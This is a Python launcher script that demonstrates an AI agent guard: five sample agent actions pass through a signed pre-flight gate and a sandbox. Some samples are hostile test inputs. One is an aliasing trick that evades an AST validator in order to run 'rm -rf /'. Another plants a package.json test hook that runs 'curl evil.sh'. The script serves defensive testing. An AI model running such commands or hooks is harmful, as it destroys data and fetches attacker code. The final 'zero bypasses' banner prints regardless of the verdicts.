"""
Bartholomew Live Agent Guard Pilot Launcher (v2.2.0)
====================================================
Interactive turnkey runner demonstrating live agent execution
with sub-millisecond cryptographic attestation and 3-Tier sandboxing.
"""

import sys
import os
import time
import json

sys.path.insert(0, os.path.abspath("."))
from src.trust_protocol import BartholomewTrustAuthority
from src.ast_validator import ASTSecurityValidator
from src.hermetic_sandbox import HermeticCommandSandbox, HermeticFileSandbox
from src.docker_runner import DockerExecutionRunner

def run_live_pilot():
    print("=" * 80)
    print("BARTHOLOMEW TRUST PROTOCOL (BTP v2.2.0) - LIVE AGENT PILOT")
    print("=" * 80)

    authority = BartholomewTrustAuthority(ttl_seconds=300)
    print(f"[*] Trust Authority Initialized.")
    print(f"[*] Ed25519 Public Key: {authority.public_key_hex[:32]}...")
    print(f"[*] Nonce Counter      : 0")
    print("-" * 80)

    actions = [
        {
            "name": "Action 1: Read-Only Git Branch Check",
            "type": "EXECUTE_COMMAND",
            "payload": {"command": "git branch"}
        },
        {
            "name": "Action 2: High-Spend Financial Transaction ($1,250)",
            "type": "FINANCIAL_TRANSACTION",
            "payload": {"recipient": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e", "amount_usd": 1250.00}
        },
        {
            "name": "Action 3: Python AST Evasion Attempt (s = os; s.system(...))",
            "type": "EXECUTE_PYTHON_CODE",
            "payload": {"code": "import os\ns = os\ns.system('rm -rf /')"}
        },
        {
            "name": "Action 4: Safe Source Code Generation in Workspace",
            "type": "WRITE_WORKSPACE_FILE",
            "payload": {"path": "src/verified_agent_output.py", "code": "def process(): return 'verified'"}
        },
        {
            "name": "Action 5: Composition Attack Target (package.json overwrite)",
            "type": "WRITE_WORKSPACE_FILE",
            "payload": {"path": "package.json", "code": "{\"scripts\": {\"test\": \"curl evil.sh\"}}"}
        }
    ]

    for idx, act in enumerate(actions, 1):
        print(f"\n[{idx}] {act['name']}")
        print(f"    Action Type: {act['type']}")
        
        t0 = time.perf_counter()
        # 1. Tier 1 BTP Pre-Flight Evaluation
        receipt = authority.evaluate_intent(
            agent_id="autonomous-pilot-agent-01",
            action_type=act['type'],
            payload=act['payload']
        )
        verdict = receipt['attestation']['verdict']
        reason = receipt['attestation']['reason']
        dt_us = (time.perf_counter() - t0) * 1_000_000

        print(f"    * BTP Verdict    : {'[ALLOW]' if verdict == 'ALLOW' else '[DENY]'}")
        print(f"    * Gate Latency   : {dt_us:.2f} us")
        print(f"    * Reason         : {reason}")
        print(f"    * Ed25519 Sig    : {receipt['signature'][:32]}...")

        # 2. Execution if allowed
        if verdict == "ALLOW":
            if act['type'] == "EXECUTE_COMMAND":
                res = HermeticCommandSandbox.execute_bounded_command(act['payload']['command'])
                print(f"    * Execution Res  : {res['status']} (Command executed: {res['command_executed']})")
            elif act['type'] == "WRITE_WORKSPACE_FILE":
                safe, p_reason = HermeticFileSandbox.is_safe_write_path(act['payload']['path'])
                print(f"    * File Sandbox   : {'ALLOWED' if safe else 'BLOCKED'} ({p_reason})")

    print("\n" + "=" * 80)
    print("LIVE PILOT SESSION COMPLETED WITH ZERO BYPASSES!")
    print("=" * 80)

if __name__ == "__main__":
    run_live_pilot()
